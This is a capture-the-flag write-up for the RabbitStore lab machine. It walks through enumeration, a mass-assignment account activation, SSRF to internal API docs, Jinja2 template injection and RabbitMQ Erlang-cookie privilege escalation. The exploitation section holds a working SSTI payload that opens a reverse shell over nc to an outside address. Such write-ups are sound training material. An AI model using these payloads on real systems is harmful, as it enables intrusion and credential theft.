# Writeup: RabbitStore

**OS**: 🐧 Linux

**Level**: 🟠 Medium

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Fri Nov 28 11:38:19 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.80.191.191
Nmap scan report for 10.80.191.191
Host is up, received user-set (0.054s latency).
Scanned at 2025-11-28 11:38:20 EST for 182s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBXuyWp8m+y9taS8DGHe95YNOsKZ1/LCOjNlkzNjrnqGS1sZuQV7XQT9WbK/yWAgxZNtBHdnUT6uSEZPbfEUjUw=
|   256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcGp6ztslpYtKYBl8IrBPBbvf3doadnd5CBsO+HFg5M
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
4369/tcp  open  epmd    syn-ack ttl 62 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown syn-ack ttl 62
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 28 11:41:22 2025 -- 1 IP address (1 host up) scanned in 182.97 seconds
```

On port 80 i found a apache webserver running. Since the nmap scan shows a redirect to `http://cloudsite.thm`, i have done a subdomain enumeration with `ffuf`, which reveals the `http://storage.cloudsite.thm`.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.cloudsite.thm" -u http://cloudsite.thm -fc 302
```

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 59ms]
:: Progress: [100000/100000] :: Job [1/1] :: 746 req/sec :: Duration: [0:02:05] :: Errors: 0 ::
```

I have done a directory bruteforce with `gobuster` on both, `http://cloudsite.thm` and `http://storage.cloudsite.thm`, but did not found anything useful.

```shell
gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 40 -o gobuster_scan
```

```
/assets               (Status: 301) [Size: 315] [--> http://cloudsite.thm/assets/]
/javascript           (Status: 301) [Size: 319] [--> http://cloudsite.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
```

```shell
gobuster dir -u http://storage.cloudsite.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 40 -o gobuster_scan2
```

```
/images               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/images/]
/js                   (Status: 301) [Size: 327] [--> http://storage.cloudsite.thm/js/]
/css                  (Status: 301) [Size: 328] [--> http://storage.cloudsite.thm/css/]
/assets               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/assets/]
/javascript           (Status: 301) [Size: 335] [--> http://storage.cloudsite.thm/javascript/]
/fonts                (Status: 301) [Size: 330] [--> http://storage.cloudsite.thm/fonts/]
/server-status        (Status: 403) [Size: 286]
```

On `http://storage.cloudsite.thm` i found a login page. I created a user and logged in and was presented with following message:

```
Sorry, this service is only for internal users working within the organization and our clients. If you are one of our clients, please ask the administrator to activate your subscription.
```

The login process did the JWT `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhhY2tlckBzZXJ2ZXIudGhtIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NjQzNTM2MjAsImV4cCI6MTc2NDM1NzIyMH0.ULq_3lHHU4QkUsxELmsIRG5jis6gQi9WSabyLso3V6w`.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "email": "hacker@server.thm",
  "subscription": "inactive",
  "iat": 1764353620,
  "exp": 1764357220
}
```

I have tried to modify the JWT (none algorithm, secret bruteforce), but i had no success. i always get a `{"message":"Invalid token"}` returned.

Since the login process is sending a request to the `/api/login` endpoint i have done a `gobuster` scan for more endpoints.

```shell
gobuster dir -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 40 -o gobuster_scan3
```

```
/Login                (Status: 405) [Size: 36]
/docs                 (Status: 403) [Size: 27]
/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/uploads              (Status: 401) [Size: 32]
/Register             (Status: 405) [Size: 36]
/Uploads              (Status: 401) [Size: 32]
/Docs                 (Status: 403) [Size: 27]
/DOCS                 (Status: 403) [Size: 27]
/LogIn                (Status: 405) [Size: 36]
/LOGIN                (Status: 405) [Size: 36]
/UPLOADS              (Status: 401) [Size: 32]
/DOCs                 (Status: 403) [Size: 27]
/UpLoads              (Status: 401) [Size: 32]
/logIn                (Status: 405) [Size: 36]
```

I have tried to access the `/docs` endpoint but i always get returned `{"message":"Access denied"}`. `/uploads` was also interestin but i got a `{"message":"Your subscription is inactive. You cannot use our services."}` returned, so the way to go was to somehow activate my account.

I registered another user with burpsuites repeater with `"subscription": "active"` appended to the jason of the POST request and got a `201 Created` back.

```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 77
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Priority: u=0

{
    "email":"hacker2@server.thm",
    "password":"test123",
    "subscription":"active"
}
```

I logged in again with the newly created user and found two upload forms, one from file and the other from url.

I used the request to the upload from url endpoint (`/api/store-url`) to get the content of `/api/docs` using SSRF. Since the response headers contain `X-Powered-By: Express` i had to do my SSRF on localhost port 3000.

```http
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 40
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhhY2tlcjJAc2VydmVyLnRobSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc2NDM1NTU5NywiZXhwIjoxNzY0MzU5MTk3fQ.h7OTrf35I2R-jbvd6-ovjJXtzYHU08hcZs8l0v7e4E4
Priority: u=0

{
    "url":"http://127.0.0.1:3000/api/docs"
}
```

```http
HTTP/1.1 200 OK
Date: Fri, 28 Nov 2025 18:58:52 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 106
ETag: W/"6a-TalWZyjqJy2PypTRoi5+I4vybKM"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
    "message":"File stored from URL successfully",
    "path":"/api/uploads/9109fabe-4de6-474e-8ed2-f8e786c00021"
}
```

Now i was able to read the content of `/api/docs` under `/api/uploads/9109fabe-4de6-474e-8ed2-f8e786c00021`.

```http
HTTP/1.1 200 OK
Date: Fri, 28 Nov 2025 18:59:10 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 28 Nov 2025 18:58:52 GMT
ETag: W/"233-19acbd51c54"
Content-Type: application/octet-stream
Content-Length: 563
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

## 💥 Exploitation:

I did send a POST request to `/api/fetch_messeges_from_chatbot` with an empty json and got back a `{"error": "username parameter is required"}`, so i repeated it with a username provided and got back following response.

```http
HTTP/1.1 200 OK
Date: Fri, 28 Nov 2025 19:11:00 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"11d-1HxLYfMSdSkQ7tcQ6oxwYKdcL+E-gzip"
Vary: Accept-Encoding
Content-Length: 285
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, hacker, our chatbot server is currently under development.</h1>
 </body>
</html>
```

Since the username provided was reflected in the response i tested for some common vulnerabilities. Providing `{"username":"{{'7'*7}}"}` in the POST request returns a `7777777` as the username in the response so SSTI on `Jinja2` is confirmed. I searched for a RCE payload for Jinja2 and got back a shell as user `azrael` and was able to read the `user.txt` inside his home directory.

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 190
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhhY2tlcjJAc2VydmVyLnRobSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc2NDM1NTU5NywiZXhwIjoxNzY0MzU5MTk3fQ.h7OTrf35I2R-jbvd6-ovjJXtzYHU08hcZs8l0v7e4E4
Priority: u=0

{
    "username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f').read() }}"
}
```

## 🔓 Priviledge Escalation:

From the portscan i know that there is erlang and rabbitmq running on the target machine so i have searched for the erlang cookie, which was located under `/var/lib/rabbitmq/`.

```shell
cat /var/lib/rabbitmq/.erlang.cookie
GN7tD1**********
```

Now i was able to get the base64 encoded password hash for the `root` user, which is `49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSB**********`. 

```shell
sudo rabbitmqctl --erlang-cookie 'GN7tD1**********' --node rabbit@forge export_definitions /tmp/x.json
cat /tmp/x.json
```

Next i had to decode the hash and remove the salt (`e3d7ba85`) which results in `295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed19**********` as the password for the `root` user.

```shell
echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSB**********' | base64 -d | xxd -p -c 100

e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed19**********
```

## 💰 Loot:

```shell
# user.txt
98d3a30fa86523c580144d**********

# root.txt
eabf7a0b05d3f2028f3e04**********
```